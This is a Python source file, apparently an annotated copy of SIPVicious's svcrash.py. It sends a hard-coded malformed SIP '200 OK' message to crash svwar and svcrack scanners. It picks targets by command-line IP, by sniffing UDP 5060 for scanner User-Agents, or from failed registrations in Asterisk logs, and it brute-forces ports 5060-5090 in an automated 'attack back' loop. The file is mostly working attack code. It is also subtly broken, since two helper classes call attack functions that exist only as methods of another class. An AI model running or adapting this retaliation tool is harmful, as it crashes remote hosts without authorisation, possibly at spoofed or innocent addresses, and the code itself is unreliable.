#!/usr/bin/env python
# svcrash.py - SIPvicious crash breaks svwar and svcrack


from libs.svhelper import __version__

__prog__ = 'svcrash'
import warnings
warnings.filterwarnings("ignore")

import socket
import select
import random
import logging
import sys
import optparse
import time
import re
import os.path
scapyversion = 0
try:
    from scapy.all import *
    scapyversion = 2
except ImportError:
    pass
try:
    from scapy import *
    scapyversion = 1
except ImportError:
    pass

# Class asteriskreadlognsend : inherits from the base class object. New-style Classes
# Mandatory and optional args can be identified with the __init__ method
class asteriskreadlognsend(object):
    #asteriskreadlognsend Comment : constructor - takes one parameter. This is arguments received from main.py wrapper
    def __init__(self,logfn):
        #asteriskreadlognsend Comment :  User variables - change if you want
        self.logfn = logfn
        self.lastsent = 30
        self.matchcount = 0
        self.log = None
        
    def checkfile(self):
        """
        Method that check file.

        """
        if (self.log is None) or (self.origlogsize > os.path.getsize(self.logfn)):
            # Open a file, returning an object of the file type described in section File Objects.
            # If the file cannot be opened, IOError is raised. When opening a file, it's preferable to use open()
            # instead of invoking the file constructor directly.
            self.log = open(self.logfn,'r')
            # Get file size
            self.origlogsize = os.path.getsize(self.logfn)
            # Set the file's current position, like stdio's fseek(). The whence argument is optional and defaults to
            # 0 (absolute file positioning); other values are 1 (seek relative to the current position) and 2
            # (seek relative to the file's end).
            self.log.seek(self.origlogsize)
        
    def findfailures(self):
        """
        Method that try to find some errors or failures.

        :return:
        """
        self.checkfile()
        # Read one entire line from the file.
        buff = self.log.readline()
        if len(buff) == 0:
            time.sleep(1)
            return
        if time.time() - self.lastsent <= 2:
            return
        # We try to get registration data, for that we are using regular expression.
        match = re.search("Registration from '(.*?)' failed for '(.*?)' - (No matching peer found|Wrong password)",buff)
        if match:                        
            self.matchcount += 1
        if self.matchcount > 6:
            self.matchcount = 0
            return match.group(2)
        else:
            #time.sleep(1)
            return 
    
    def start(self):
        """
        Method that perform attack.

        :return:
        """
        try:
            while 1:
                ipaddr = self.findfailures()
                # If ipaddr is not Empty start Attack
                if ipaddr:
                    # Iterate via start range of ports
                    for i in xrange(5060,5080):
                        # Ragerding to the version we using v1 or v2 of attack
                        if scapyversion > 0:
                            sendattack2(ipaddr,i)
                        else:
                            sendattack(ipaddr,i)
        except KeyboardInterrupt:
            return

# Class sniffnsend : inherits from the base class object. New-style Classes
# Mandatory and optional args can be identified with the __init__ method
class sniffnsend(object):
    #sniffnsend Comment : constructor - takes one parameter. This is arguments received from main.py wrapper
    def __init__(self,port=5060):
        # sniffnsend Comment :  User variables - change if you want
        self.port = port
        self.lastsent = 30
        self.mytimer = dict()

    def checknsend(self,pkt):
        """
        Method that parse a network traffic. Basically this is a simply sniffer.

        :param pkt:
        """
        # Get data from package
        data = str(pkt.getlayer(Raw))
        # Get Source IP address
        ipaddr = pkt.getlayer(IP).src
        # Get Source port
        port = pkt.getlayer(UDP).sport
        src = ipaddr,port
        if not src in self.mytimer:
            #print "add %s:%s" % src
            self.mytimer[src] = time.time() - 2
        if time.time() - self.mytimer[src] > 2:
            if time.time() - self.lastsent > 0.5:
                # Generate header
                if ('User-Agent: friendly-scanner' in data) or \
                    ('User-Agent: Asterisk PBX' in data and 'CSeq: 1 REGISTER' in data):
                    if 'REGISTER ' in data:
                        #print data
                        self.lastsent = time.time()
                        self.mytimer[src] = time.time()
                        sendattack2(ipaddr,port)
        if len(self.mytimer) > 0:
            for src in self.mytimer.keys():
                if time.time() - self.mytimer[src] > 10:
                    #print "del %s:%s:%s" % (str(src),time.time(),self.mytimer[src])
                    del(self.mytimer[src])
    
    def start(self):        
        """
        Method that start sniffer.

        """
        try:
            sniff(prn=self.checknsend,filter="udp port %s" % self.port, store=0)
        except KeyboardInterrupt:
            print "goodbye"

# Class SVCRASH : inherits from the base class object. New-style Classes
# Mandatory and optional args can be identified with the __init__ method
class SVCRASH(object):

    # Definitions of member class variables
    # These variables, will be called as self.xxx in the class methods
    # It's a coding error to declare these variables here
    # Normally, we declare an __init__ function (which is the class
    # constructor) and declare the variable as self.num= 10 etc....
    #
    # A better way to write this code would be :
    # def __init__(self):
    #     self.crashmsg='SIP/2.0 200 OK\r\nVia: SIP/2.0/UDP 8.7.6.5:5061;bran'
    #  ... etc ...
    crashmsg='SIP/2.0 200 OK\r\nVia: SIP/2.0/UDP 8.7.6.5:5061;bran'
    crashmsg+='ch=z9hG4bK-573841574;rport\r\n\r\nContent-length: 0\r\nFrom: '
    crashmsg+='"100"<sip:100@localhost>; tag=683a653a7901746865726501627965\r\nUs'
    crashmsg+='er-agent: Telkom Box 2.4\r\nTo: "100"<sip:100@localhost>\r\nCse'
    crashmsg+='q: 1 REGISTER\r\nCall-id: 469585712\r\nMax-forwards: 70\r\n\r\n'

    def getArgs(self):
        """
        Method that parse arguments

        :return options, args
        """
        parser = optparse.OptionParser(usage="%prog svcrash [options]",version="%prog v"+str(__version__))
        parser.add_option('--auto',help="Automatically send responses to attacks",
                      dest="auto",default=False, action="store_true",)
        parser.add_option('--astlog',help="Path for the asterisk full logfile",
                      dest="astlog")
        parser.add_option('-d',help="specify attacker's ip address", dest="ipaddr",
                      )
        parser.add_option('-p',help="specify attacker's port", dest="port",
                      type="int",default=5060
        )
        parser.add_option('-b',help="bruteforce the attacker's port", dest="bruteforceport",
                      default=False, action="store_true")
        (options, args) = parser.parse_args()
        if not (options.auto or options.astlog):
            if not options.ipaddr:
                parser.error("When auto or astlog is not specified, you need to pass an IP address")
        elif options.auto:
            if scapyversion == 0:
                parser.error("You need to install scapy from http://www.secdev.org/projects/scapy/")
        elif options.astlog:
            if not os.path.exists(options.astlog):
                parser.error("Could not read %s" % options.astlog)
        if (scapyversion == 0) or not (options.auto):
            try:
                # Create a new socket using the given address family, socket type and protocol number.
                # The address family should be AF_INET (the default), AF_INET6 or AF_UNIX. The socket type should be
                # SOCK_STREAM (the default), SOCK_DGRAM or perhaps one of the other SOCK_ constants. The protocol number
                # is usually zero and may be omitted in that case.
                s = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
                # Bind the socket to address. The socket must not already be bound.
                s.bind(('0.0.0.0',5060))
            except socket.error:
                parser.error("You either need have port 5060 available or install scapy from http://www.secdev.org/projects/scapy/")
        return options,args

    def sendattack(self, ipaddr, port):
        """
        Method that performs attak (v1)
        :param ipaddr: string
        :param port: string
        """
        # Create a new socket using the given address family, socket type and protocol number.
        # The address family should be AF_INET (the default), AF_INET6 or AF_UNIX. The socket type should be
        # SOCK_STREAM (the default), SOCK_DGRAM or perhaps one of the other SOCK_ constants. The protocol number
        # is usually zero and may be omitted in that case.
        s = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
        # Bind the socket to address. The socket must not already be bound.
        s.bind(('0.0.0.0',5060))
        # Set destination IP and port
        dst=ipaddr,port
        # Send data to the socket. The socket should not be connected to a remote socket, since the destination socket
        #  is specified by address.
        s.sendto(self.crashmsg,dst)
        sys.stdout.write("Attacking back %s:%s\r\n" % (ipaddr,port))
        # Close the socket.
        s.close()

    def sendattack2(self, ipaddr, port):
        """
        Method that performs attak (v2)
        :param ipaddr:
        :param port:
        """
        packet = IP(dst=ipaddr)/UDP(sport=5060,dport=port)/self.crashmsg
        sys.stdout.write("Attacking back %s:%s\r\n" % (ipaddr,port))
        send(packet,verbose=0)

    #SVCRASH Comment :  beware if you change anything below - execution starts here
    def main(self):
        #Here is the main function of the class.
        #Note that it's just a name unlike java...
        #See below for the entry point of the program.
        # Parse arguments.
        # The OptionParser constructor has no required arguments, but a number of optional keyword arguments.
        # You should always pass them as keyword arguments, i.e. do not rely on the order in which the arguments are declared.
        # More about this method of parsing, see there http://docs.python.org/2/library/optparse.html#optparse.OptionParser
        options,args = self.getArgs()
        if options.auto:
            sns = sniffnsend()
            sns.start()
        elif options.astlog:
            ast=asteriskreadlognsend(options.astlog)
            ast.start()
        elif options.bruteforceport:
            for port in xrange(5060,5090):
                self.sendattack(options.ipaddr,port)
        else:
            self.sendattack(options.ipaddr,options.port)
